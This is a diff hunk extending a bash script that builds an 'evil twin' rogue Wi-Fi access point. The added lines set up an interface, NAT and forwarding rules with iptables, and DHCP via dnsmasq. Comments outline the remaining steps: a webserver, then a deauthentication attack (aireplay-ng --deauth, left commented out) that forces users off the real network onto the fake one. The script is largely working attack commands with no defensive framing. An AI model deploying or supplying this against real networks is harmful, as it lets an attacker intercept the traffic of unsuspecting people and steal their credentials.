@@ -60,3 +60,39 @@ airmong-ng start $WLAN
 # 	Give the evil twin the same name as the network you are attacking for best results
 echo -e "starting evil twin"
 airbase-ng -e $ESSID -c $CHANNEL $WLANMON
+
+# Give the evil twin can access the internet.
+echo -e "Configuring at0 interface"
+ifconfig at0
+
+# give at0 an ip address: 
+ifconfig at0 10.0.0.1 up
+
+# route all traffic through at0
+# 	For bridged Ethernet Adapter
+if [ "$BRIDGE" = "eth0" ]; then
+	iptables --flush
+	iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
+	iptables --append FORWARD --in-interface at0 -j ACCEPT
+else
+	# Otherwise bridged Wireless Adapter
+	iptables --flush
+	iptables --table nat --append POSTROUTING --out-interface $BRIDGE -j MASQUERADE
+	iptables --append FORWARD --in-interface at0 -j ACCEPT
+fi
+
+# enable port forwarding: 
+echo -e "Enabling port forwarding"
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# 13. evil twin is now setup, now need to allocate ip addresses to clients
+dnsmasq -C /root/Desktop/eviltwin/dnsmasq.conf -d
+
+echo -e "Success ${ESSID} is up"
+# 14. NOW startup the webserver, see the tutorial for more info
+
+# 15. Finally run the deauthorization attack and kick people off the legit network onto ours
+# 	- TODO will add details on this later too
+
+# 16. now deauthorize clients so they connect to our network
+# 	aireplay-ng –deauth 0 -a <BSSID> wlan0mon
